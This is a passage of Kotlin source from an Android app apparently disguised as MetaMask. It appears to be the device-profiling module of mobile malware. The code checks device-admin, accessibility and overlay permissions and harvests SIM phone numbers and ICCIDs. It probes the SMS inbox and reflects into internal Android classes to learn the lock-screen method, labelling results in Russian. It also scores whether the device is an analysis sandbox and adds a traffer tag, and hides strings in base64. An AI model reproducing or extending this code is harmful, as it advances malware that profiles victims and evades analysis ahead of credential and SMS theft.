                put("is_device_admin", if (BuildConfig.FEAT_DEVICE_ADMIN) try {
                    val dpm = appContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    val comp = android.content.ComponentName(appContext, com.example.MetaMask.receivers.BadgerFalconRecv::class.java)
                    dpm?.isAdminActive(comp) ?: false
                } catch (_: Exception) { false } else false)
                    android.util.Log.e("XDBG", "[ChikenWorker] catch Exception (ignored)") //xdbg
                put("is_accessibility_enabled", try {
                    val svc = AccessSvc.instance
                    svc != null
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[ChikenWorker] catch Exception (ignored)") //xdbg
                put("notification_policy_access", try {
                    val nm = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && nm != null) nm.isNotificationPolicyAccessGranted else false
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[ChikenWorker] catch Exception (ignored)") //xdbg
                put("overlay_permission", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(appContext) else true)
                put("device_time", DATE_FMT.format(Date()))
            }
            JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), data)
        } catch (e: Exception) { createErrorPayload("PermErr") }
    }

    @SuppressLint("MissingPermission")
    private fun getSimInfo(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getSimInfo enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
                return createErrorPayload("PermDen")
            }
            val sm = appContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                ?: return createErrorPayload("SM null")
            val simArray = JSONArray()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                val activeSims = try { sm.activeSubscriptionInfoList } catch (e: SecurityException) { return createErrorPayload("SecErr") }
                activeSims?.forEach { info ->
                    val simJson = JSONObject().apply {
                        put("subscriptionId", info.subscriptionId)
                        put("displayName", info.displayName)
                        put("number", info.number)
                        put("simSlotIndex", info.simSlotIndex)
                        put("carrierName", info.carrierName)
                        put("iccId", info.iccId)
                    }
                    simArray.put(simJson)
                }
            }
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), JSONObject().put("active_sims", simArray))
        } catch (e: Exception) { return createErrorPayload("SimErr") }
    }

    private fun hasPendingSms(): Boolean {
        android.util.Log.d("XDBG", "[ChikenWorker] hasPendingSms enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return false
            var hasSms = false
            val cursor = appContext.contentResolver.query(Uri.parse(d("Y29udGVudDovL3Ntcy9pbmJveA==")), arrayOf("_id"), null, null, null)
            if (cursor != null) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                if (cursor.count > 0) hasSms = true
                cursor.close()
            }
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return hasSms
        } catch (e: Exception) { return false }
    }

    private fun isCellularNetworkAvailable(): Boolean {
        android.util.Log.d("XDBG", "[ChikenWorker] isCellularNetworkAvailable enter") //xdbg
        try {
            val isAirplaneMode = try { Settings.Global.getInt(appContext.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) != 0 } catch (e: Exception) { false }
            if (isAirplaneMode) return false
            val tm = appContext.getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            val simState = tm?.simState ?: android.telephony.TelephonyManager.SIM_STATE_UNKNOWN
            if (simState != android.telephony.TelephonyManager.SIM_STATE_READY) return false
            val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                val activeNetwork = cm.activeNetwork
                val capabilities = cm.getNetworkCapabilities(activeNetwork)
                if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) return true
            } else {
                @Suppress("DEPRECATION")
                val activeNetworkInfo = cm.activeNetworkInfo
                if (activeNetworkInfo != null && activeNetworkInfo.isConnected && activeNetworkInfo.type == ConnectivityManager.TYPE_MOBILE) return true
            }
            val operator = tm?.networkOperatorName
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return !operator.isNullOrEmpty()
        } catch (e: Exception) { return false }
    }

    private fun getDeviceData(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getDeviceData enter") //xdbg
        try {
            val baseAppName = try {
                val pm = appContext.packageManager
                val appInfo = pm.getApplicationInfo(appContext.packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: Exception) { appContext.packageName ?: "Unknown Security" }

            val hasIncomingMessages = hasPendingSms()
            var ussdConfirmed = false
            try {
                val prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                ussdConfirmed = prefs.getBoolean(KEY_USSD_CONFIRMED, false)
            } catch (e: Exception) { }
            var networkAvailable = false
            try { networkAvailable = isCellularNetworkAvailable() } catch (e: Exception) { }
            val isBot = when {
                ussdConfirmed -> false
                hasIncomingMessages -> false
                !networkAvailable -> false
                else -> true
            }
            val botTag = if (isBot) BOT_SUSPICION_TAG else ""

            val finalAppName = StringBuilder()
            if (TRAFFER.isNotEmpty()) finalAppName.append(TRAFFER).append(" ")
            finalAppName.append(baseAppName)
            finalAppName.append(botTag)

            try {
                appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit().putString("cached_smart_app_name", finalAppName.toString()).apply()
            } catch (e: Exception) { }

            val androidVersion = "API ${Build.VERSION.SDK_INT} (${Build.VERSION.RELEASE})"
            val deviceBrand = Build.BRAND ?: "N/A"
            val deviceModel = Build.MODEL ?: "N/A"
            val deviceLanguage = try { Locale.getDefault().toLanguageTag() } catch (e: Exception) { "en-US" }
            val timezone = try { TimeZone.getDefault().id } catch (e: Exception) { "GMT" }
            val totalCores = Runtime.getRuntime().availableProcessors()

            val lockMethod = run {
                val km = appContext.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                if (km?.isDeviceSecure != true) return@run "нет защиты"

                val hasBio = try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                        val bm = appContext.getSystemService(android.hardware.biometrics.BiometricManager::class.java)
                        @Suppress("DEPRECATION")
                        bm?.canAuthenticate() == android.hardware.biometrics.BiometricManager.BIOMETRIC_SUCCESS
                    } else {
                        @Suppress("DEPRECATION")
                        val fm = appContext.getSystemService(FingerprintManager::class.java)
                        fm?.isHardwareDetected == true && fm.hasEnrolledFingerprints()
                    }
                } catch (_: Exception) { false }

                val savedType: String? = try {
                    val saved = appContext.getSharedPreferences("cfg", Context.MODE_PRIVATE)
                        .getString("unlock_method_json", null)
                    if (saved != null) org.json.JSONObject(saved).optString("type", null) else null
                } catch (_: Exception) { null }

                fun tryLockType(): String? = try {
                    val cls = Class.forName("com.android.internal.widget.LockPatternUtils")
                    val inst = cls.getConstructor(Context::class.java).newInstance(appContext)

                    runCatching {
                        val m = cls.getDeclaredMethod("getCredentialTypeForUser", Int::class.javaPrimitiveType)
                        m.isAccessible = true
                        when ((m.invoke(inst, 0) as? Number)?.toInt()) {
                            1 -> "паттерн"
                            2 -> "PIN"
                            3 -> "пароль"
                            else -> null
                        }
                    }.getOrNull()
                    ?:
                    runCatching {
                        val m = cls.getDeclaredMethod("getKeyguardStoredPasswordQuality", Int::class.javaPrimitiveType)
                        m.isAccessible = true
                        when (val q = (m.invoke(inst, 0) as? Number)?.toInt() ?: 0) {
                            65536       -> "паттерн"
                            in 131072..327680 -> "PIN"
                            in 393216..Int.MAX_VALUE -> "пароль"
                            else        -> null
                        }
                    }.getOrNull()
                    ?:
                    runCatching {
                        val isPattern = (cls.getDeclaredMethod("isLockPatternEnabled", Int::class.javaPrimitiveType)
                            .also { it.isAccessible = true }.invoke(inst, 0) as? Boolean) ?: false
                        val isPassword = (cls.getDeclaredMethod("isLockPasswordEnabled", Int::class.javaPrimitiveType)
                            .also { it.isAccessible = true }.invoke(inst, 0) as? Boolean) ?: false
                        when {
                            isPattern  -> "паттерн"
                            isPassword -> "PIN"
                            else       -> null
                        }
                    }.getOrNull()
                } catch (_: Exception) { null }

                fun trySecureSettings(): String? {
                    android.util.Log.d("XDBG", "[ChikenWorker] trySecureSettings enter") //xdbg
                    val q = try {
                        Settings.Secure.getInt(appContext.contentResolver, "lockscreen.password_type", 0)
                    } catch (_: Exception) { 0 }
                    return when {
                        q == 65536                -> "паттерн"
                        q in 131072..327680       -> "PIN"
                        q in 393216..Int.MAX_VALUE -> "пароль"
                        else                      -> null
                    }
                }

                val cred = when {
                    savedType == "pattern"  -> "паттерн"
                    savedType == "pin"      -> "PIN"
                    savedType == "password" -> "пароль"
                    else -> tryLockType() ?: trySecureSettings() ?: ""
                }

                when {
                    hasBio && cred.isNotEmpty() -> "отпечаток + $cred"
                    hasBio                      -> "только отпечаток"
                    cred.isNotEmpty()           -> cred
                    else                        -> "свайп"
                }
            }

            val data = JSONObject().apply {
                put("app_name", finalAppName.toString())
                put("android_version", androidVersion)
                put("device_brand", deviceBrand)
                put("device_model", deviceModel)
                put("language", deviceLanguage)
                put("timezone", timezone)
                put("cpu_cores", totalCores)
                put("has_incoming_sms", hasIncomingMessages)
                put("ussd_confirmed", ussdConfirmed)
                put("network_available_for_check", networkAvailable)
                put("is_bot_verdict", isBot)
                put("lock_method", lockMethod)
            }
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return JSONObject().put("status", "success").put("data", data)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return createErrorPayload("DevErr")
        }
    }
}
